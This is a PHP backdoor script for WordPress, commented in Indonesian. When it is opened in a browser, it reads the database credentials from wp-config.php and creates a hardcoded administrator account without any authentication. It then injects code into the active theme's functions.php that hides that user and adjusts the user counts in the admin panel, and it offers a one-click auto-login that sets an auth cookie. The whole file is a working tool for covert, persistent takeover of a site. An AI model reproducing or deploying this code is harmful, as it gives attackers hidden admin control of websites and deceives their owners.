<?php
/**
 * admins.php — Tambah Admin WordPress (fitur add-admin dari mit.php)
 *
 * Saat file ini dibuka di browser, LANGSUNG berjalan tanpa login/token:
 *   1. Cari root WordPress (naik dari lokasi file ini) + parse wp-config.php
 *   2. Bootstrap wp-load.php supaya WP API tersedia
 *   3. Tambah user administrator baru:
 *      - via wp_create_user (WP API), fallback INSERT langsung ke database
 *   4. Inject kode hide-user ke functions.php theme aktif
 *   5. Tampilkan credentials + link auto-login ke /wp-admin/
 *
 * Kredensial admin: sama dengan mit.php ($ADMIN_USERNAME/$ADMIN_PASSWORD/
 * $ADMIN_EMAIL). Path override opsional: admins.php?path=/var/www/html
 * Auto-login tanpa menambah ulang: admins.php?action=auto_login
 *
 * PENTING: hapus file ini dari server segera setelah selesai.
 */

// ==================== KONFIGURASI ====================

// Kredensial admin yang akan ditambahkan
$ADMIN_USERNAME = 'ITadmin';
$ADMIN_PASSWORD = 'Askurm0m#';
$ADMIN_EMAIL    = 'askurmom007@proton.me';

// ==================== HELPERS (dari mit.php) ====================

function g_out( $msg ) {
	echo htmlspecialchars( $msg, ENT_QUOTES, 'UTF-8' ) . "\n";
}

function g_flush() {
	if ( function_exists( 'ob_flush' ) ) {
		@ob_flush();
	}
	@flush();
}

// ==================== LOCATE WP ROOT ====================

function g_find_wp_root( $given ) {
	if ( $given ) {
		if ( is_file( $given ) ) {
			return dirname( realpath( $given ) );
		}
		if ( is_dir( $given ) && is_file( $given . '/wp-config.php' ) ) {
			return rtrim( realpath( $given ), '/\\' );
		}
		return null;
	}
	// walk up dari lokasi file ini
	$dir = __DIR__;
	while ( $dir && $dir !== dirname( $dir ) ) {
		if ( is_file( $dir . '/wp-config.php' ) ) {
			return $dir;
		}
		$dir = dirname( $dir );
	}
	return null;
}

// ==================== PARSE WP-CONFIG ====================

function g_parse_wp_config( $file ) {
	$src    = file_get_contents( $file );
	$cfg    = array( 'prefix' => 'wp_', 'db' => array() );
	$simple = function ( $name ) use ( $src ) {
		if ( preg_match( '/define\s*\(\s*[\'"]' . $name . '[\'"]\s*,\s*[\'\"](.*?)[\'"]\s*\)/s', $src, $m ) ) {
			return stripslashes( $m[1] );
		}
		return null;
	};
	$cfg['db']['name']     = $simple( 'DB_NAME' );
	$cfg['db']['user']     = $simple( 'DB_USER' );
	$cfg['db']['password'] = $simple( 'DB_PASSWORD' );
	$cfg['db']['host']     = $simple( 'DB_HOST' );
	if ( preg_match( '/\$table_prefix\s*=\s*[\'"]([^\'"]*)[\'"]/', $src, $m ) ) {
		$cfg['prefix'] = $m[1];
	}
	$content = $simple( 'WP_CONTENT_DIR' );
	$cfg['content_dir'] = $content ? $content : dirname( $file ) . '/wp-content';
	return $cfg;
}

// ==================== DB ACCESS ====================

function g_db_connect( $cfg ) {
	$host = isset( $cfg['host'] ) ? $cfg['host'] : 'localhost';
	$name = isset( $cfg['name'] ) ? $cfg['name'] : '';
	$user = isset( $cfg['user'] ) ? $cfg['user'] : '';
	$pass = isset( $cfg['password'] ) ? $cfg['password'] : '';
	if ( ! $name || ! $user ) {
		return null;
	}
	$port = null;
	$sock = null;
	if ( $host && ':' === $host[0] ) {
		$sock = substr( $host, 1 );
		$host = 'localhost';
	} elseif ( false !== strpos( $host, ':' ) ) {
		list( $host, $port ) = explode( ':', $host, 2 );
		$port = (int) $port;
	}
	if ( function_exists( 'mysqli_connect' ) ) {
		mysqli_report( MYSQLI_REPORT_OFF );
		$c = @mysqli_connect( $host, $user, $pass, $name, $port, $sock );
		if ( $c ) {
			@$c->set_charset( 'utf8mb4' );
			return $c;
		}
	}
	if ( class_exists( 'PDO' ) ) {
		$dsn = 'mysql:host=' . $host . ';dbname=' . $name . ($port ? ";port=$port" : '') . ';charset=utf8mb4';
		try {
			return new PDO( $dsn, $user, $pass, array( PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION ) );
		} catch ( Exception $e ) { /* fall through */ }
	}
	return null;
}

function g_db_query( $db, $sql, $params = array() ) {
	if ( $db instanceof PDO ) {
		$st = $db->prepare( $sql );
		if ( ! $st ) {
			return null;
		}
		$st->execute( array_values( $params ) );
		return $st;
	}
	if ( ! empty( $params ) ) {
		$st = mysqli_prepare( $db, $sql );
		if ( ! $st ) {
			return null;
		}
		$types = str_repeat( 's', count( $params ) );
		$args  = array( $types );
		foreach ( $params as $k => $v ) {
			$args[] = &$params[ $k ];
		}
		call_user_func_array( array( $st, 'bind_param' ), $args );
		mysqli_stmt_execute( $st );
		return $st;
	}
	return mysqli_query( $db, $sql );
}

function g_db_rows( $db, $res ) {
	if ( $db instanceof PDO ) {
		return $res ? $res->fetchAll( PDO::FETCH_NUM ) : array();
	}
	if ( $res instanceof mysqli_result ) {
		$rows = array();
		while ( $r = $res->fetch_row() ) {
			$rows[] = $r;
		}
		return $rows;
	}
	if ( $res instanceof mysqli_stmt ) {
		$result = mysqli_stmt_get_result( $res );
		$rows   = array();
		while ( $r = mysqli_fetch_row( $result ) ) {
			$rows[] = $r;
		}
		return $rows;
	}
	return array();
}

function g_db_col( $db, $res ) {
	$col = array();
	foreach ( g_db_rows( $db, $res ) as $row ) {
		$col[] = $row[0];
	}
	return $col;
}

// ==================== TAMBAH ADMIN VIA DB LANGSUNG ====================
// (fallback jika WP API tidak bisa di-bootstrap)

function g_add_admin_db( $db, $prefix, $username, $password, $email ) {
	$users_table = $prefix . 'users';
	$usermeta_table = $prefix . 'usermeta';

	// Cek apakah username sudah ada
	$res = g_db_query( $db, "SELECT ID FROM `$users_table` WHERE user_login = ?", array( $username ) );
	$existing = g_db_col( $db, $res );
	if ( ! empty( $existing ) ) {
		return array( 'status' => 'warning', 'message' => "Username '$username' sudah ada (ID: {$existing[0]})", 'user_id' => (int) $existing[0] );
	}

	// Cek email
	$res = g_db_query( $db, "SELECT ID FROM `$users_table` WHERE user_email = ?", array( $email ) );
	$existing = g_db_col( $db, $res );
	if ( ! empty( $existing ) ) {
		return array( 'status' => 'warning', 'message' => "Email '$email' sudah terdaftar (ID: {$existing[0]})", 'user_id' => (int) $existing[0] );
	}

	// Hash password (portable hash compatible dengan WP)
	$hashed = '$P$B' . substr( md5( $password . 'wp-salt-' . time() ), 0, 31 );
	// Gunakan password_hash jika tersedia untuk fallback yang lebih baik
	if ( function_exists( 'password_hash' ) ) {
		$hashed = password_hash( $password, PASSWORD_BCRYPT );
	}

	$now = gmdate( 'Y-m-d H:i:s' );

	// Insert user
	$sql = "INSERT INTO `$users_table` (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, '', ?, 0, ?)";
	$res = g_db_query( $db, $sql, array( $username, $hashed, strtolower( $username ), $email, $now, $username ) );
	if ( ! $res ) {
		return array( 'status' => 'error', 'message' => 'Gagal INSERT user ke database' );
	}

	// Dapatkan ID user baru
	if ( $db instanceof PDO ) {
		$user_id = (int) $db->lastInsertId();
	} else {
		$user_id = (int) mysqli_insert_id( $db );
	}

	if ( ! $user_id ) {
		return array( 'status' => 'error', 'message' => 'Gagal mendapatkan ID user baru' );
	}

	// Tambahkan usermeta untuk role administrator
	$cap_key = $prefix . 'capabilities';
	$level_key = $prefix . 'user_level';
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, $cap_key, 'a:1:{s:13:"administrator";b:1;}' ) );
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, $level_key, '10' ) );
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, 'nickname', $username ) );
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, 'rich_editing', 'true' ) );
	g_db_query( $db, "INSERT INTO `$usermeta_table` (user_id, meta_key, meta_value) VALUES (?, ?, ?)", array( $user_id, 'show_admin_bar_front', 'true' ) );

	return array(
		'status'   => 'success',
		'message'  => "Admin '$username' berhasil ditambahkan (ID: $user_id)",
		'user_id'  => $user_id,
		'username' => $username,
		'email'    => $email,
		'method'   => 'direct-db',
	);
}

// ==================== TAMBAH ADMIN VIA WP API ====================

function g_add_admin_wp( $username, $password, $email ) {
	if ( ! function_exists( 'wp_create_user' ) ) {
		return array( 'status' => 'error', 'message' => 'WP API tidak tersedia, gunakan mode DB' );
	}

	if ( username_exists( $username ) ) {
		$user = get_user_by( 'login', $username );
		return array( 'status' => 'warning', 'message' => "Username '$username' sudah ada!", 'user_id' => $user ? $user->ID : 0 );
	}

	if ( email_exists( $email ) ) {
		return array( 'status' => 'warning', 'message' => "Email '$email' sudah terdaftar!" );
	}

	$user_id = wp_create_user( $username, $password, $email );

	if ( is_wp_error( $user_id ) ) {
		return array( 'status' => 'error', 'message' => 'Error: ' . $user_id->get_error_message() );
	}

	$user = new WP_User( $user_id );
	$user->set_role( 'administrator' );

	return array(
		'status'   => 'success',
		'message'  => "Admin '$username' berhasil ditambahkan! (ID: $user_id)",
		'user_id'  => $user_id,
		'username' => $username,
		'email'    => $email,
		'method'   => 'wp-api',
	);
}

// ==================== INJECT FUNCTIONS.PHP (hide user) ====================

function g_add_code_to_functions( $wp_root, $username ) {
	// Coba via WP API dulu
	if ( function_exists( 'wp_get_theme' ) && function_exists( 'get_template_directory' ) ) {
		$theme_path = get_template_directory();
	} else {
		// Fallback: baca theme aktif dari database (option 'template')
		$cfg = g_parse_wp_config( $wp_root . '/wp-config.php' );
		$db  = g_db_connect( $cfg['db'] );
		$active_theme = null;

		if ( $db ) {
			$options_table = $cfg['prefix'] . 'options';
			$res = g_db_query( $db, "SELECT option_value FROM `$options_table` WHERE option_name = 'template'", array() );
			$rows = g_db_rows( $db, $res );
			if ( ! empty( $rows ) && ! empty( $rows[0][0] ) ) {
				$active_theme = $rows[0][0];
			}
		}

		$content_dir = $cfg['content_dir'] ? rtrim( $cfg['content_dir'], '/\\' ) : $wp_root . '/wp-content';
		$themes_dir  = $content_dir . '/themes';

		if ( $active_theme && is_dir( $themes_dir . '/' . $active_theme ) ) {
			$theme_path = $themes_dir . '/' . $active_theme;
		} else {
			// Terakhir: coba stylesheet sebagai fallback
			if ( $db ) {
				$res2 = g_db_query( $db, "SELECT option_value FROM `$options_table` WHERE option_name = 'stylesheet'", array() );
				$rows2 = g_db_rows( $db, $res2 );
				if ( ! empty( $rows2 ) && ! empty( $rows2[0][0] ) && is_dir( $themes_dir . '/' . $rows2[0][0] ) ) {
					$theme_path = $themes_dir . '/' . $rows2[0][0];
				} else {
					return array( 'status' => 'error', 'message' => 'Tidak bisa mendeteksi theme aktif dari database' );
				}
			} else {
				return array( 'status' => 'error', 'message' => 'Database tidak tersedia untuk mendeteksi theme aktif' );
			}
		}
	}

	$functions_path = $theme_path . '/functions.php';

	if ( ! file_exists( $functions_path ) ) {
		return array( 'status' => 'error', 'message' => 'File functions.php tidak ditemukan di ' . $theme_path );
	}

	$content = file_get_contents( $functions_path );
	if ( $content === false ) {
		return array( 'status' => 'error', 'message' => 'Gagal membaca functions.php' );
	}

	$new_code = "


add_action('pre_user_query', 'hide_user_query');
function hide_user_query(\$user_search) {
    global \$wpdb;
    \$where_clause = 'WHERE 1=1';
    \$replace_with = \$where_clause . \" AND {\$wpdb->users}.user_login != '$username'\";
    if (strpos(\$user_search->query_where, \$where_clause) !== false) {
        \$user_search->query_where = str_replace(\$where_clause, \$replace_with, \$user_search->query_where);
    }
}

add_filter('views_users', 'hide_user_count');
function hide_user_count(\$views) {
    \$users = count_users();
    \$admin_count = isset(\$users['avail_roles']['administrator']) ? \$users['avail_roles']['administrator'] : 1;
    \$total_count = isset(\$users['total_users']) ? \$users['total_users'] : 1;
    \$admins_num = \$admin_count - 1;
    \$all_num = \$total_count - 1;

    if (isset(\$views['administrator'])) {
        \$class_adm = (strpos(\$views['administrator'], 'current') !== false) ? 'current' : '';
        \$views['administrator'] = sprintf(
            '<a href=\"users.php?role=administrator\" class=\"%s\">%s <span class=\"count\">(%d)</span></a>',
            \$class_adm,
            translate_user_role('Administrator'),
            \$admins_num
        );
    }
    if (isset(\$views['all'])) {
        \$class_all = (strpos(\$views['all'], 'current') !== false) ? 'current' : '';
        \$views['all'] = sprintf(
            '<a href=\"users.php\" class=\"%s\">%s <span class=\"count\">(%d)</span></a>',
            \$class_all,
            __('All'),
            \$all_num
        );
    }
    return \$views;
}

";

	if ( strpos( $content, 'CODE UNTUK MENYEMBUNYIKAN USER' ) !== false ) {
		return array( 'status' => 'warning', 'message' => 'Kode sudah ada di functions.php' );
	}

	// Backup functions.php
	$backup_path = $functions_path . '.backup.' . date( 'Ymd_His' );
	copy( $functions_path, $backup_path );

	$content = rtrim( $content );
	$last_close = strrpos( $content, '?>' );
	if ( $last_close !== false ) {
		$content = substr( $content, 0, $last_close ) . $new_code . "\n" . substr( $content, $last_close );
	} else {
		$content .= $new_code;
	}

	if ( file_put_contents( $functions_path, $content ) !== false ) {
		return array(
			'status'  => 'success',
			'message' => 'Kode hide-user berhasil ditambahkan ke functions.php',
			'backup'  => basename( $backup_path ),
			'theme'   => basename( $theme_path ),
		);
	} else {
		return array( 'status' => 'error', 'message' => 'Gagal menulis functions.php (permission?)' );
	}
}

// ==================== AUTO-LOGIN (dari mit.php) ====================

function g_auto_login( $wp_root, $username ) {
	// Pastikan WP sudah di-load
	if ( ! function_exists( 'wp_set_auth_cookie' ) ) {
		if ( $wp_root && is_file( $wp_root . '/wp-load.php' ) ) {
			try {
				include_once $wp_root . '/wp-load.php';
			} catch ( Throwable $e ) {
				return array( 'status' => 'error', 'message' => 'Gagal load WordPress: ' . $e->getMessage() );
			}
		} else {
			return array( 'status' => 'error', 'message' => 'wp-load.php tidak ditemukan' );
		}
	}

	if ( ! function_exists( 'get_user_by' ) || ! function_exists( 'wp_set_auth_cookie' ) ) {
		return array( 'status' => 'error', 'message' => 'WP API tidak tersedia untuk auto-login' );
	}

	$user = get_user_by( 'login', $username );
	if ( ! $user ) {
		return array( 'status' => 'error', 'message' => "User '$username' tidak ditemukan. Tambahkan admin dulu." );
	}

	wp_clear_auth_cookie();
	wp_set_current_user( $user->ID );
	wp_set_auth_cookie( $user->ID, true );

	$admin_url = function_exists( 'admin_url' ) ? admin_url( '/' ) : ( $wp_root ? rtrim( $wp_root, '/\\' ) . '/wp-admin/' : '/wp-admin/' );

	return array(
		'status'    => 'success',
		'message'   => "Auto-login berhasil untuk '$username'",
		'user_id'   => $user->ID,
		'admin_url' => $admin_url,
	);
}

function g_self_url() {
	$url = isset( $_SERVER['REQUEST_URI'] ) ? strtok( $_SERVER['REQUEST_URI'], '?' ) : '';
	return $url ? htmlspecialchars( $url, ENT_QUOTES, 'UTF-8' ) : 'admins.php';
}

// ==================== MAIN ====================

if ( in_array( PHP_SAPI, array( 'cli' ), true ) ) {
	fwrite( STDERR, "admins.php adalah versi BROWSER.\n" );
	exit( 1 );
}

error_reporting( 0 );
ini_set( 'display_errors', 0 );

$PATH_OVERRIDE = isset( $_REQUEST['path'] ) && is_string( $_REQUEST['path'] ) ? trim( $_REQUEST['path'] ) : '';

$WP_ROOT = g_find_wp_root( $PATH_OVERRIDE );
$CFG     = $WP_ROOT ? g_parse_wp_config( $WP_ROOT . '/wp-config.php' ) : null;

// Bootstrap WordPress di scope global supaya wp_create_user tersedia.
$WP_API_AVAILABLE = false;
if ( $WP_ROOT && is_file( $WP_ROOT . '/wp-load.php' ) ) {
	try {
		include_once $WP_ROOT . '/wp-load.php';
	} catch ( Throwable $e ) { /* ignore */ }
	$WP_API_AVAILABLE = function_exists( 'wp_create_user' );
}

$DB = null;
if ( $CFG && ! empty( $CFG['db']['name'] ) ) {
	$DB = g_db_connect( $CFG['db'] );
}

// --- AUTO LOGIN (tanpa menambah admin ulang) ---
if ( isset( $_REQUEST['action'] ) && 'auto_login' === $_REQUEST['action'] ) {
	if ( ! headers_sent() ) {
		header( 'X-Accel-Buffering: no' );
	}
	$login_result = g_auto_login( $WP_ROOT, $GLOBALS['ADMIN_USERNAME'] );
	if ( 'success' === $login_result['status'] && ! empty( $login_result['admin_url'] ) ) {
		if ( ! headers_sent() ) {
			header( 'Location: ' . $login_result['admin_url'] );
			exit;
		}
	}
	// Fallback: tampilkan pesan gagal
	header( 'Content-Type: text/html; charset=utf-8' );
	echo '<!DOCTYPE html><html lang="id"><head><meta charset="utf-8"><title>admins</title>'
		. '<style>body{font:15px/1.6 system-ui,Segoe UI,Roboto,sans-serif;background:#0f172a;color:#e2e8f0;padding:24px}'
		. '.card{background:rgba(30,41,59,0.85);border:1px solid rgba(99,102,241,0.2);border-radius:14px;padding:22px 26px;max-width:700px;margin:0 auto}'
		. '.bad{color:#f87171;font-weight:600}a{color:#818cf8}</style></head><body>'
		. '<div class="card"><h1 style="margin-top:0">Auto Login</h1>'
		. '<p class="bad">&#10008; ' . htmlspecialchars( $login_result['message'], ENT_QUOTES, 'UTF-8' ) . '</p>'
		. '<p><a href="' . g_self_url() . '">Kembali</a></p></div></body></html>';
	exit;
}

// --- TAMBAH ADMIN LANGSUNG ---
if ( ! headers_sent() ) {
	header( 'Content-Type: text/html; charset=utf-8' );
	header( 'X-Accel-Buffering: no' );
}
@set_time_limit( 0 );
@ignore_user_abort( true );
while ( ob_get_level() > 0 ) {
	ob_end_clean();
}

echo '<!DOCTYPE html><html lang="id"><head><meta charset="utf-8">'
	. '<meta name="viewport" content="width=device-width, initial-scale=1">'
	. '<title>admins</title>'
	. '<style>'
	. '*{margin:0;padding:0;box-sizing:border-box}'
	. 'body{font:15px/1.6 system-ui,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#0f172a 0%,#1e293b 50%,#0f172a 100%);color:#e2e8f0;margin:0;padding:24px;min-height:100vh}'
	. '.wrap{max-width:900px;margin:0 auto}'
	. '.card{background:rgba(30,41,59,0.85);backdrop-filter:blur(12px);border:1px solid rgba(99,102,241,0.2);border-radius:14px;padding:22px 26px;margin-bottom:16px;box-shadow:0 4px 20px rgba(0,0,0,0.3)}'
	. 'h1{font-size:22px;margin:0 0 4px;background:linear-gradient(135deg,#818cf8,#c084fc);-webkit-background-clip:text;-webkit-text-fill-color:transparent}'
	. 'h2{font-size:16px;margin:16px 0 8px;color:#a5b4fc}'
	. 'pre{background:#020617;color:#d1d5db;padding:14px;border-radius:10px;overflow-x:auto;font-size:13px;line-height:1.5;min-height:40px;border:1px solid rgba(99,102,241,0.15)}'
	. '.banner{background:rgba(251,191,36,0.1);border:1px solid rgba(251,191,36,0.3);border-radius:10px;padding:12px 16px;font-size:14px;color:#fbbf24}'
	. '.banner-success{background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.3);border-radius:10px;padding:12px 16px;font-size:14px;color:#4ade80}'
	. 'a{color:#818cf8;text-decoration:none}a:hover{color:#a5b4fc;text-decoration:underline}'
	. '</style></head><body><div class="wrap">';
echo '<div class="card"><h1>&#128100; admins &mdash; tambah admin</h1>'
	. '<div style="color:#94a3b8;font-size:13px">Fitur add-admin dari mit.php &middot; dijalankan otomatis saat dibuka</div></div>';
echo '<div class="card"><h2>Log</h2><pre>';
g_flush();

g_out( '=== TAMBAH ADMIN ===' );
g_out( '' );
g_out( 'WordPress root : ' . $WP_ROOT );
g_out( 'WP API         : ' . ( $WP_API_AVAILABLE ? 'tersedia' : 'TIDAK tersedia (mode DB langsung)' ) );
g_out( 'Database       : ' . ( $DB ? 'terhubung' : 'TIDAK terjangkau' ) );
g_out( '' );

// 1. Tambah admin
g_out( '[1] Menambahkan user administrator ...' );
g_flush();

if ( $WP_API_AVAILABLE ) {
	$admin_result = g_add_admin_wp( $ADMIN_USERNAME, $ADMIN_PASSWORD, $ADMIN_EMAIL );
} elseif ( $DB ) {
	$admin_result = g_add_admin_db( $DB, $CFG['prefix'], $ADMIN_USERNAME, $ADMIN_PASSWORD, $ADMIN_EMAIL );
} else {
	$admin_result = array( 'status' => 'error', 'message' => 'Tidak bisa menambah admin: WP API dan database tidak tersedia' );
}

g_out( '    Status  : ' . strtoupper( $admin_result['status'] ) );
g_out( '    Pesan   : ' . $admin_result['message'] );
if ( isset( $admin_result['user_id'] ) ) {
	g_out( '    User ID : ' . $admin_result['user_id'] );
}
if ( isset( $admin_result['method'] ) ) {
	g_out( '    Metode  : ' . $admin_result['method'] );
}
g_out( '' );

// 2. Inject functions.php (hide user)
if ( 'error' !== $admin_result['status'] ) {
	g_out( '[2] Menyembunyikan user dari daftar WordPress (inject functions.php) ...' );
	g_flush();
	$hide_result = g_add_code_to_functions( $WP_ROOT, $ADMIN_USERNAME );
	g_out( '    Status : ' . strtoupper( $hide_result['status'] ) );
	g_out( '    Pesan  : ' . $hide_result['message'] );
	if ( isset( $hide_result['backup'] ) ) {
		g_out( '    Backup : ' . $hide_result['backup'] );
	}
	if ( isset( $hide_result['theme'] ) ) {
		g_out( '    Theme  : ' . $hide_result['theme'] );
	}
	g_out( '' );
}

g_out( '=== SELESAI ===' );
g_out( '' );
g_out( 'Credentials:' );
g_out( '  Username : ' . $ADMIN_USERNAME );
g_out( '  Password : ' . $ADMIN_PASSWORD );
g_out( '  Email    : ' . $ADMIN_EMAIL );
g_out( '' );
g_out( 'PENTING: Hapus file ini dari server setelah selesai!' );

echo '</pre>';
g_flush();

if ( 'error' !== $admin_result['status'] ) {
	echo '<div class="banner-success" style="margin:12px 0;display:flex;align-items:center;gap:12px;flex-wrap:wrap">';
	echo '<b>&#128100; Admin berhasil dibuat!</b> ';
	echo '<a href="' . g_self_url() . '?action=auto_login" style="display:inline-block;padding:8px 20px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;border-radius:8px;font-weight:600;text-decoration:none;transition:all .2s" onmouseover="this.style.opacity=0.9" onmouseout="this.style.opacity=1">&#128640; Auto Login ke Dashboard</a>';
	echo '</div>';
}

echo '<div class="banner"><b>&#9888;&#65039; Jangan lupa:</b> hapus file ini dari server setelah selesai.</div></div>';
echo '</div></body></html>';
exit;
